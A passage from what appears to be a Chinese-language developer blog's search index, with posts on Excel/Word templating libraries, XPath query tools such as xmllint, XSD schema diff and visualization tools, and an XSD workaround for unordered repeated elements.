模版去生成复杂的 EXCEL 表格，标签化。</a></li>\n<li><a href=\"https://github.com/optilude/xlsx-template\" target=\"_blank\" rel=\"noopener\">GitHub - optilude/xlsx-template: A NodeJS module to generate Excel files in .xlsx format from a template created with Excel itself</a></li>\n<li><a href=\"https://github.com/ivahaev/go-xlsx-templater\" target=\"_blank\" rel=\"noopener\">GitHub - ivahaev/go-xlsx-templater: Simple xlsx template based document generator</a></li>\n<li><a href=\"https://github.com/ngs-doo/TemplaterExamples\" target=\"_blank\" rel=\"noopener\">GitHub - ngs-doo/TemplaterExamples: Creating reports in .NET and Java</a></li>\n<li><a href=\"https://github.com/anmoroz/xlsx-template-php\" target=\"_blank\" rel=\"noopener\">GitHub - anmoroz/xlsx-template-php: A library for templating of Excel Office documents. Supports MS Excel xlsx. Uses PHPExcel library.</a></li>\n<li><a href=\"https://github.com/optimistex/xlsx-template-ex\" target=\"_blank\" rel=\"noopener\">GitHub - optimistex/xlsx-template-ex: The template engine for generate xlsx documents</a></li>\n<li><a href=\"http://deepoove.com/poi-tl/\" target=\"_blank\" rel=\"noopener\">poi-tl</a></li>\n<li><a href=\"https://github.com/shadz3rg/PHPStamp\" target=\"_blank\" rel=\"noopener\">GitHub - shadz3rg/PHPStamp: The XSL-way templating library for MS Office Word DOCX documents.</a></li>\n<li><a href=\"https://github.com/guigrpa/docx-templates\" target=\"_blank\" rel=\"noopener\">GitHub - guigrpa/docx-templates: Template-based docx report creation</a></li>\n<li><a href=\"https://github.com/legion-zver/go-docx-templates\" target=\"_blank\" rel=\"noopener\">GitHub - legion-zver/go-docx-templates</a></li>\n<li><a href=\"https://github.com/Skrol29/opentbs\" target=\"_blank\" rel=\"noopener\">GitHub - Skrol29/opentbs: With OpenTBS you can merge OpenOffice - LibreOffice and Ms Office documents with PHP using the TinyButStrong template engine. Simple use OpenOffice - LibreOffice or Ms Office to edit your templates : DOCX, XLSX, PPTX, ODT, OSD, ODP and other formats. That is the Natural Template philosophy.</a></li>\n<li><a href=\"https://github.com/guigrpa/docx-templates\" target=\"_blank\" rel=\"noopener\">GitHub - guigrpa/docx-templates: Template-based docx report creation</a></li>\n</ul>\n<p>… 太多了，不列了</p>\n<p>目前<a href=\"https://github.com/Skrol29/opentbs\" target=\"_blank\" rel=\"noopener\">GitHub - Skrol29/opentbs: With OpenTBS you can merge OpenOffice - LibreOffice and Ms Office documents with PHP using the TinyButStrong template engine. Simple use OpenOffice - LibreOffice or Ms Office to edit your templates : DOCX, XLSX, PPTX, ODT, OSD, ODP and other formats. That is the Natural Template philosophy.</a>、<a href=\"https://github.com/optilude/xlsx-template\" target=\"_blank\" rel=\"noopener\">GitHub - optilude/xlsx-template: A NodeJS module to generate Excel files in .xlsx format from a template created with Excel itself</a>這幾個星星數比較多</p>\n<p><a href=\"https://exwog.com/\" target=\"_blank\" rel=\"noopener\">Exwog - from Excel to Word reports generator (xls to doc, xlsx to docx) by template</a><br><a href=\"https://github.com/HY-Org/hy.common.report\" target=\"_blank\" rel=\"noopener\">GitHub - HY-Org/hy.common.report: 报表、Excel 操作类库。Java 转 Excel、Excel 转 Java</a><br><a href=\"https://github.com/hanzhaoxin/ExcelReport\" target=\"_blank\" rel=\"noopener\">GitHub - hanzhaoxin/ExcelReport: This reporting engine is built on NPOI.</a><br><a href=\"https://github.com/Jimmy-JS/laravel-report-generator\" target=\"_blank\" rel=\"noopener\">GitHub - Jimmy-JS/laravel-report-generator: Rapidly Generate Simple Pdf, CSV, &amp; Excel Report Package on Laravel</a><br><a href=\"https://github.com/biezhi/excel-plus\" target=\"_blank\" rel=\"noopener\">GitHub - biezhi/excel-plus: ❇️ Improve the productivity of the Excel operation library. https://git.io/vNjQy</a></p>\n<p><strong>2019-09-08</strong><br>可以看這篇<a href=\"https://malagege.github.io/blog/2019/09/03/php-excel-templator-%E7%94%A8%E7%AF%84%E6%9C%AC-template-%E5%BF%AB%E9%80%9F%E7%94%A2%E7%94%9FExcel%E6%96%B9%E6%B3%95/\">php-excel-templator 用範本(template)快速產生Excel方法 | 程式狂想筆記</a></p>\n","categories":["實用工具"],"tags":["excel","word","template"]},{"title":"XML 好用的查詢工具","url":"/blog/2019/09/05/XML-%E5%A5%BD%E7%94%A8%E7%9A%84%E6%9F%A5%E8%A9%A2%E5%B7%A5%E5%85%B7/","content":"<p>最近做 Digital Data Exchange 介接資料<br>XML 平常是會用，有知道一些 Library 可以解析裡面資料<br>但進階的 xpath 平常沒有什麼用到<br>就找找看有什麼實用工具<br>讓未來 debug 有更快的方法</p>\n<a id=\"more\"></a>\n<p>首先 Digital Data Exchange 是一個規則(XML)<br>因為可能會用到 xpath 在想有什麼好工具可以用?</p>\n<h2 id=\"XSD\"><a href=\"#XSD\" class=\"headerlink\" title=\"XSD\"></a>XSD</h2><p>首先，先講解什麼是 XSD(XML Schema D)<br>我以前這篇文章有提過<a href=\"https://malagege.github.io/blog/2018/10/20/%E9%A9%97%E8%AD%89%E5%BF%AB%E9%80%9F%E6%AA%A2%E6%9F%A5JSON%E6%96%B9%E6%B3%95/\">驗證快速檢查JSON方法 | 程式狂想筆記</a></p>\n<p><a href=\"https://blog.yowko.com/xml-intellisense-xsd/\" target=\"_blank\" rel=\"noopener\">使用 XSD 為 XML 客製 Intellisense 輸入選單 - Yowko’s Notes</a><br><a href=\"http://xsdvi.sourceforge.net/\" target=\"_blank\" rel=\"noopener\">XSDVi</a><br><a href=\"http://regis.cosnier.free.fr/?page=XSDDiagram\" target=\"_blank\" rel=\"noopener\">Dgis XSD Diagram</a></p>\n<p>但我還沒找到好用的工具</p>\n<h2 id=\"bash-指令\"><a href=\"#bash-指令\" class=\"headerlink\" title=\"bash 指令\"></a>bash 指令</h2><h3 id=\"xmllint\"><a href=\"#xmllint\" class=\"headerlink\" title=\"xmllint\"></a>xmllint</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 安裝</span></span><br><span class=\"line\">sudo apt install libxml2-utils</span><br><span class=\"line\"><span class=\"comment\"># 使用 xpath</span></span><br><span class=\"line\">xmllint --xpath <span class=\"string\">\"//*[local-name()='product_version']/*[local-name()='name']/text()\"</span> file.xml</span><br></pre></td></tr></table></figure>\n<p>不過不知到為什麼公司有裝的工具不能用<br>可能版本太舊?</p>\n<p><strong>2019-09-10</strong><br>有找到方法<br><a href=\"https://stackoverflow.com/questions/11975862/xmllint-unknown-option-xpath\" target=\"_blank\" rel=\"noopener\">xmllint unknown option ‘–xpath’ - Stack Overflow</a></p>\n<p>結果查東西還是要用人工去掃…<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">xmllint --shell xxxx.xml &lt;&lt; EOF</span><br><span class=\"line\"><span class=\"string\">'//xxx'</span></span><br><span class=\"line\">EOF</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">xmllint --shell xxxx.xml &lt;&lt;&lt;<span class=\"string\">'xpath //xxx'</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> f <span class=\"keyword\">in</span> `find . -<span class=\"built_in\">type</span> f  -name <span class=\"string\">'*.xml'</span>`</span><br><span class=\"line\"><span class=\"keyword\">do</span></span><br><span class=\"line\">xmllint --shell <span class=\"variable\">$f</span> &lt;&lt;&lt;<span class=\"string\">'xpath //oooo/'</span> </span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> f <span class=\"keyword\">in</span> `find . -<span class=\"built_in\">type</span> f  -name <span class=\"string\">'*.xml'</span>`</span><br><span class=\"line\"><span class=\"keyword\">do</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$f</span></span><br><span class=\"line\">xmllint --shell <span class=\"variable\">$f</span> &lt;&lt;&lt;<span class=\"string\">'xpath //oooo[.!=\"aa\" and .!=\"bbb\" and .!=\"ccc\"]/text()'</span></span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> f <span class=\"keyword\">in</span> *.xml</span><br><span class=\"line\"><span class=\"keyword\">do</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$f</span></span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> f <span class=\"keyword\">in</span> `find . -<span class=\"built_in\">type</span> f  -name <span class=\"string\">'*.xml'</span>`</span><br><span class=\"line\"><span class=\"keyword\">do</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$f</span></span><br><span class=\"line\">xmllint --shell <span class=\"variable\">$f</span> &lt;&lt;&lt;<span class=\"string\">'xpath //xxx[.=\"123456\"]/text()'</span></span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"xpath\"><a href=\"#xpath\" class=\"headerlink\" title=\"xpath\"></a>xpath</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 安裝</span></span><br><span class=\"line\">sudo apt install libxml-xpath-perl</span><br><span class=\"line\"><span class=\"comment\"># xpath</span></span><br><span class=\"line\">xpath -e <span class=\"string\">'//book/name/text()'</span>  sample.xml</span><br></pre></td></tr></table></figure>\n<h2 id=\"xml2\"><a href=\"#xml2\" class=\"headerlink\" title=\"xml2\"></a>xml2</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 安裝</span></span><br><span class=\"line\">sudo apt install xml2</span><br><span class=\"line\">cat sample.xml |xml2</span><br></pre></td></tr></table></figure>\n<p>詳細可看: <a href=\"https://blog.mythsman.com/post/5d2b5ebf25601931a5f8d885/\" target=\"_blank\" rel=\"noopener\">Shell解析处理XML方法汇总</a> <a href=\"/blog/2019/09/05/XML-好用的查詢工具/web1.png\" title=\"備份圖\">備份圖</a></p>\n<p>其他參考</p>\n<ul>\n<li><a href=\"http://www.kbase101.com/question/25515.html\" target=\"_blank\" rel=\"noopener\">如何使用XMLLINT和BASH解析XML文件中的命名空间 - 智库101 - 一个基于CC版权的问答分享平台</a></li>\n<li><a href=\"https://blog.csdn.net/droyon/article/details/8655517\" target=\"_blank\" rel=\"noopener\">/bin/bash: xmllint: 未找到命令 - hailushijie的专栏 - CSDN博客</a></li>\n<li><a href=\"https://blog.mythsman.com/post/5d2b5ebf25601931a5f8d885/\" target=\"_blank\" rel=\"noopener\">Shell解析处理XML方法汇总</a></li>\n<li><a href=\"https://www.cnblogs.com/qiantuwuliang/archive/2009/05/17/1458684.html\" target=\"_blank\" rel=\"noopener\">XPath详解,总结 - 钱途无梁 - 博客园</a></li>\n<li><a href=\"https://www.cnblogs.com/backlion/p/8554749.html\" target=\"_blank\" rel=\"noopener\">xpath注入详解 - 渗透测试中心 - 博客园</a></li>\n</ul>\n<h2 id=\"實用-vscode-套件\"><a href=\"#實用-vscode-套件\" class=\"headerlink\" title=\"實用 vscode 套件\"></a>實用 vscode 套件</h2><p><a href=\"https://marketplace.visualstudio.com/items?itemName=redhat.vscode-xml\" target=\"_blank\" rel=\"noopener\">XML - Visual Studio Marketplace</a><br>記得要安裝 Java<br>要設定 home 路徑<br><a href=\"https://marketplace.visualstudio.com/items?itemName=DotJoshJohnson.xml\" target=\"_blank\" rel=\"noopener\">XML Tools - Visual Studio Marketplace</a><br>可查 xpath ，算是滿方便可以查詢套件!!</p>\n<h2 id=\"相關-xpath-一些教學網站\"><a href=\"#相關-xpath-一些教學網站\" class=\"headerlink\" title=\"相關 xpath 一些教學網站\"></a>相關 xpath 一些教學網站</h2><p>因為還沒有很熟悉，之後開一篇做 xpath 筆記<br>XSD 可能也會記錄怎麼看，感覺認真看 XML 也是個大坑!!!</p>\n<ul>\n<li><a href=\"https://www.cnblogs.com/qiantuwuliang/archive/2009/05/17/1458684.html\" target=\"_blank\" rel=\"noopener\">XPath详解,总结 - 钱途无梁 - 博客园</a></li>\n<li><a href=\"https://www.cnblogs.com/backlion/p/8554749.html\" target=\"_blank\" rel=\"noopener\">xpath注入详解 - 渗透测试中心 - 博客园</a></li>\n<li><a href=\"https://cythilya.github.io/2017/12/16/nightwatch-xpath/\" target=\"_blank\" rel=\"noopener\">Nightwatch101 #6：使用 Xpath 定位網頁元素 | Summer。桑莫。夏天</a></li>\n</ul>\n<p><strong>2019-10-02</strong></p>\n<p>xpath 可以寫這麼複雜<br>但要記得<code>[]</code>比對資料要帶<code>&quot;</code><br><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\">DataReference[text()=//ShowArtist[@SequenceNumber=\"1\"]/ArtistDataReference]</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"http://xpather.com/\" target=\"_blank\" rel=\"noopener\">XPath online real-time tester, evaluator and generator for XML &amp; HTML</a><br><a href=\"https://doc.phpspider.org/xpath.html\" target=\"_blank\" rel=\"noopener\">爬虫进阶开发——xpath选择器常见用法 · phpspider开发文档</a><br><a href=\"http://blog.chenpeng.info/html/2375\" target=\"_blank\" rel=\"noopener\">在 xml.value 中, XPath中使用 text() 函数的重要性 | 陈鹏个人博客</a></p>\n<p>relative path ./<br>/<br>//xxxx[xxxx[xxxx=sss]]=//xxxx[xxxx]/</p>\n<p>domxpath</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$xpath = <span class=\"keyword\">new</span> \\DOMXpath(<span class=\"keyword\">$this</span>-&gt;xml); <span class=\"comment\">// 這邊 xml 是放 DOMDocument</span></span><br><span class=\"line\">$query=<span class=\"string\">\"xxxx/oooo[1]/vvvvv/ddd\"</span>; <span class=\"comment\">// relative ??</span></span><br><span class=\"line\"><span class=\"comment\">// 目前看到官網也有類似相關範例</span></span><br><span class=\"line\"><span class=\"comment\">// 我的認知 Xpath 前面都要有 // or /</span></span><br><span class=\"line\"><span class=\"comment\">// 這邊應該都是從 root 開始</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">$node = $xpath-&gt;query($query)-&gt;item(<span class=\"number\">0</span>);</span><br><span class=\"line\">$node = !<span class=\"keyword\">empty</span>($node) ? trim($node-&gt;nodeValue) : <span class=\"string\">''</span> ;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">foreach</span> ($dates <span class=\"keyword\">as</span> $key =&gt; $a_node) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> ($a_node-&gt;childNodes <span class=\"keyword\">as</span> $value) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($value-&gt;nodeName == <span class=\"string\">'xxxx'</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<p>這邊注意 SimpleXML 跟 domxpath 完全沒什麼關係<br>我目前看法這些應該是兩個不同 Library<br>所以用法也不太一樣<br>domxpath 回傳東西很像 Javascript 的 Node<br>記得 domxpath 抓</p>\n<p>看起來很不錯套件<a href=\"https://github.com/servo-php/fluidxml\" target=\"_blank\" rel=\"noopener\">servo-php/fluidxml: FluidXML, the PHP library for manipulating XML with a concise and fluent API.</a></p>\n","categories":["XML"],"tags":["bash","xml","vscode"]},{"title":"XSD 快速比較差異的工具","url":"/blog/2019/09/11/XSD-%E5%BF%AB%E9%80%9F%E6%AF%94%E8%BC%83%E5%B7%AE%E7%95%B0%E7%9A%84%E5%B7%A5%E5%85%B7/","content":"<p>最近收到要異動 XML<br>在很大的 XML 中<br>我需要尋找異動的 tag<br>尋找有用工具來分析 XSD</p>\n<a id=\"more\"></a>\n<h2 id=\"NVM-安裝\"><a href=\"#NVM-安裝\" class=\"headerlink\" title=\"NVM 安裝\"></a>NVM 安裝</h2><p><a href=\"https://chocolatey.org/packages/maven\" target=\"_blank\" rel=\"noopener\">Chocolatey Gallery | Maven 3.6.1.20190711</a></p>\n<p>快速解決安裝環境的問題XD</p>\n<h2 id=\"Schema-Diff-Command-Line-Tool\"><a href=\"#Schema-Diff-Command-Line-Tool\" class=\"headerlink\" title=\"Schema Diff Command Line Tool\"></a>Schema Diff Command Line Tool</h2><p><a href=\"https://www.membrane-soa.org/soa-model-doc/1.4/cmd-tool/schemadiff-tool.htm\" target=\"_blank\" rel=\"noopener\">Schema Diff Tool</a></p>\n<p>可這邊下載檔案<code>soa-model-distribution-1.6.0-bin.zip</code><br>解壓縮出來<br>需要設定 <code>SOA_MODEL_HOME</code> 環境變數<br>再設定 path += <code>%SOA_MODEL_HOME%\\bin</code></p>\n<p>更懶的話，直接到<code>bin</code>資料夾做</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">schemadiff &lt;&lt;first schema&gt;&gt; &lt;&lt;second schema&gt;&gt; [&lt;&lt;output directory&gt;&gt;]</span><br><span class=\"line\">C:\\soa-model-distribution-1.4.X&gt;bin\\schemadiff samples\\diff\\original\\article.xsd samples\\diff\\modified\\article.xsd schema-diff-output</span><br></pre></td></tr></table></figure>\n<p>會產生 HTML 檔案<br>這可說是非常完美的格式<br>有順利執行</p>\n<h2 id=\"xsdiff\"><a href=\"#xsdiff\" class=\"headerlink\" title=\"xsdiff\"></a>xsdiff</h2><p><a href=\"https://github.com/valters/xsdiff\" target=\"_blank\" rel=\"noopener\">valters/xsdiff: Compare XML XSD schemas with semantic diff, simple and straight differences report. Perfect if you need to see what has changed in huge schema file.</a></p>\n<p>安裝很簡單</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">mvn clean install</span><br><span class=\"line\"><span class=\"comment\"># 單個檔案</span></span><br><span class=\"line\">java -jar XsDiff-app/target/xsdiff-app-1.0.0.jar old/xxx.xsd new/xxx.xsd</span><br><span class=\"line\"><span class=\"comment\"># 多個比較</span></span><br><span class=\"line\"><span class=\"comment\"># 記得每個資料夾需要放schema.lst XSD 清單</span></span><br><span class=\"line\">java -jar XsDiff-app/target/xsdiff-app-1.0.0.jar old/ new/</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://github.com/valters/xsdiff/blob/0a31b666979a88e4bdf49b29c32947864a0a965c/XsDiff-app/src/main/java/io/github/valters/xsdiff/app/Main.java#L61\" target=\"_blank\" rel=\"noopener\">xsdiff/Main.java at 0a31b666979a88e4bdf49b29c32947864a0a965c · valters/xsdiff</a></p>\n<p>有順利跑出來，但是比較像文字 diff 比較</p>\n<h2 id=\"XSD-Compare\"><a href=\"#XSD-Compare\" class=\"headerlink\" title=\"XSD Compare\"></a>XSD Compare</h2><p><a href=\"https://github.com/yoep/xsd-compare\" target=\"_blank\" rel=\"noopener\">yoep/xsd-compare: Compare different XSD version files to each other</a></p>\n<p>因為我裝JAVA 10<br>所以需要改<code>pom.xml</code></p>\n<p><a href=\"https://github.com/javafx-maven-plugin/javafx-maven-plugin\" target=\"_blank\" rel=\"noopener\">javafx-maven-plugin/javafx-maven-plugin: Maven plugin for JavaFX</a><br><a href=\"https://github.com/javafx-maven-plugin/javafx-maven-plugin/issues/287\" target=\"_blank\" rel=\"noopener\">Support for current JDK 9 and JDK 10 · Issue #287 · javafx-maven-plugin/javafx-maven-plugin</a><br><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">pluginRepositories</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">pluginRepository</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">id</span>&gt;</span>oss-sonatype-snapshots<span class=\"tag\">&lt;/<span class=\"name\">id</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">url</span>&gt;</span>https://oss.sonatype.org/content/groups/public/<span class=\"tag\">&lt;/<span class=\"name\">url</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">snapshots</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">enabled</span>&gt;</span>true<span class=\"tag\">&lt;/<span class=\"name\">enabled</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">snapshots</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">pluginRepository</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">pluginRepositories</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>上面 xml 放在 <code>&lt;build&gt;</code>前面</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>com.zenjava<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>javafx-maven-plugin<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>8.9.0-SNAPSHOT<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">configuration</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">appName</span>&gt;</span>XSD Compare<span class=\"tag\">&lt;/<span class=\"name\">appName</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>XSD Compare<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>在修改版本</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">mvn clean install</span><br><span class=\"line\"><span class=\"comment\"># 完成編譯，可直接執行</span></span><br><span class=\"line\">java -jar ./target/xsd-compare-0.0.6-SNAPSHOT.jar</span><br></pre></td></tr></table></figure>\n<p>GUI 介面看起來很炫<br>但是我的 xml 不能開啟 orz</p>\n<h2 id=\"小記\"><a href=\"#小記\" class=\"headerlink\" title=\"小記\"></a>小記</h2><p>目前還是<code>Schema Diff Command Line Tool</code>最實用<br>不果改天找到更好用的工具在更新</p>\n","categories":["XML"],"tags":["xsd"]},{"title":"XSD 檢核遇到 tag 順序拿掉不能放 unbounded","url":"/blog/2020/10/15/XSD-%E6%AA%A2%E6%A0%B8%E9%81%87%E5%88%B0-tag-%E9%A0%86%E5%BA%8F%E5%95%8F%E9%A1%8C/","content":"<p>如題<br>xs:sequence 會檢查 xml tag 順序<br><a href=\"https://stackoverflow.com/questions/23103526/how-can-i-remove-the-ordering-from-a-xsd-sequence\" target=\"_blank\" rel=\"noopener\">xml - how can i remove the ordering from a xsd sequence - Stack Overflow</a><br>要排除這個方法要 xs:all<br>但會遇到 unbounded 不能正常運作</p>\n<p>最後找到一篇解決方法</p>\n<a id=\"more\"></a>\n<p><a href=\"https://ephrain.net/xml-%E8%AE%93-xml-schema-%E5%85%81%E8%A8%B1-xml-%E4%B8%AD%E7%9A%84%E5%85%83%E7%B4%A0%E5%A4%9A%E6%AC%A1%E5%87%BA%E7%8F%BE%E3%80%81%E4%B8%94%E9%A0%86%E5%BA%8F%E4%B8%8D%E5%9B%BA%E5%AE%9A/\" target=\"_blank\" rel=\"noopener\">[XML] 讓 XML schema 允許 XML 中的元素多次出現、且順序不固定 | EPH 的程式日記</a></p>\n<figure class=\"highlight xsd\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">xsd:element</span> <span class=\"attr\">name</span>=<span class=\"string\">\"event\"</span> <span class=\"attr\">minOccurs</span>=<span class=\"string\">\"1\"</span> <span class=\"attr\">maxOccurs</span>=<span class=\"string\">\"unbounded\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">xsd:complexType</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">xsd:sequence</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">xsd:choice</span> <span class=\"attr\">minOccurs</span>=<span class=\"string\">\"1\"</span> <span class=\"attr\">maxOccurs</span>=<span class=\"string\">\"unbounded\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">xsd:element</span> <span class=\"attr\">type</span>=<span class=\"string\">\"xsd:string\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"keyword\"</span>/&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">xsd:element</span> <span class=\"attr\">type</span>=<span class=\"string\">\"xsd:string\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"except\"</span>/&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">xsd:choice</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">xsd:sequence</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">xsd:complexType</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">xsd:element</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>程式過了，太神啦!! 為什麼sequence 裡面可以放 choice ??<br>先不管啦!! 又解決這一關</p>\n<p>奇怪的事情，開發環境竟然原本用 xsd:sequence 會過(Window)<br>但在正式環境就不會…</p>\n<p>其他相關</p>\n<ul>\n<li><a href=\"https://www.w3school.com.cn/schema/schema_complex_indicators.asp\" target=\"_blank\" rel=\"noopener\">XSD 复合类型指示器</a></li>\n<li><a href=\"https://imonce.github.io/2019/03/15/XSD%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E5%AE%8C%E6%95%B4%E7%89%88/\" target=\"_blank\" rel=\"noopener\">XSD/XML Schema 学习笔记完整版 | C_Meng PSNA</a></li>\n<li><a href=\"https://stackoverflow.com/questions/23103526/how-can-i-remove-the-ordering-from-a-xsd-sequence\" target=\"_blank\" rel=\"noopener\">xml - how can i remove the ordering from a xsd sequence - Stack Overflow</a></li>\n<li><a href=\"https://ephrain.net/xml-%E8%AE%93-xml-schema-%E5%85%81%E8%A8%B1-xml-%E4%B8%AD%E7%9A%84%E5%85%83%E7%B4%A0%E5%A4%9A%E6%AC%A1%E5%87%BA%E7%8F%BE%E3%80%81%E4%B8%94%E9%A0%86%E5%BA%8F%E4%B8%8D%E5%9B%BA%E5%AE%9A/\" target=\"_blank\" rel=\"noopener\">[XML] 讓 XML schema 允許 XML 中的元素多次出現、且順序不固定 | EPH 的程式日記</a></li>\n</ul>\n","categories":["XML"],"tags":["xsd"]},{"title":"XSD 看 XML 結構一些工具","url":"/blog/2019/09/07/XSD-%E7%9C%8B-XML-%E7%B5%90%E6%A7%8B%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7/","content":"<p>最近看 XSD 檔案，覺得這個東西有轉成圖片來看<br>不過找了一些工具試試</p>\n<a id=\"more\"></a>\n<h2 id=\"XSD-實用工具\"><a href=\"#XSD-實用工具\" class=\"headerlink\" title=\"XSD 實用工具\"></a>XSD 實用工具</h2><h3 id=\"XSDVI\"><a href=\"#XSDVI\" class=\"headerlink\" title=\"XSDVI\"></a>XSDVI</h3><p>這個可以轉成圖<br>目前不方便測試這個<br>功能好像還不錯!!</p>\n<p><a href=\"http://xsdvi.sourceforge.net/ipo.svg\" target=\"_blank\" rel=\"noopener\">http://xsdvi.sourceforge.net/ipo.svg</a></p>\n<p><a href=\"http://sourceforge.net/projects/xsdvi/\" target=\"_blank\" rel=\"noopener\">http://sourceforge.net/projects/xsdvi/</a></p>\n<p>git clone 下來<br>ant 完會在dist<br>在依照範例執行可以產生 SVG<br>還滿簡單的</p>\n<h3 id=\"jEdit-XML-Plugin\"><a href=\"#jEdit-XML-Plugin\" class=\"headerlink\" title=\"jEdit XML Plugin\"></a>jEdit XML Plugin</h3><p>沒測試</p>\n<h3 id=\"CAM-editor\"><a href=\"#CAM-editor\" class=\"headerlink\" title=\"CAM editor\"></a>CAM editor</h3><p><a href=\"http://camprocessor.sourceforge.net/wiki/index.php/Main_Page\" target=\"_blank\" rel=\"noopener\">CAM Editor</a></p>\n<p>我 linux 打不開就沒測試了</p>\n<h3 id=\"XSD-Diagram\"><a href=\"#XSD-Diagram\" class=\"headerlink\" title=\"XSD Diagram\"></a>XSD Diagram</h3><p><a href=\"http://regis.cosnier.free.fr/?page=XSDDiagram\" target=\"_blank\" rel=\"noopener\">Dgis XSD Diagram</a></p>\n<p>不知道為什麼我的 XSD 不能用在上面…</p>\n<h3 id=\"Eclipse-XSD-Editor\"><a href=\"#Eclipse-XSD-Editor\" class=\"headerlink\" title=\"Eclipse XSD Editor\"></a>Eclipse XSD Editor</h3><p>可以簡單看 XML 工具</p>\n<p>PS安裝小記:<br>不知道為什麼我用 <code>apt</code> 安裝不能打開<br>使用 <code>snap</code> 安裝 eclipse 就正常…</p>\n<p>這個能看 XML 格式，算滿中規中矩，介面不太差</p>\n<p>參考來源:<br><a href=\"https://en.wikipedia.org/wiki/XML_Schema_editors\" target=\"_blank\" rel=\"noopener\">XML Schema editors - Wikipedia</a></p>\n<h3 id=\"QXmlEdit\"><a href=\"#QXmlEdit\" class=\"headerlink\" title=\"QXmlEdit\"></a>QXmlEdit</h3><p><a href=\"https://kknews.cc/zh-tw/tech/gqqj39m.html\" target=\"_blank\" 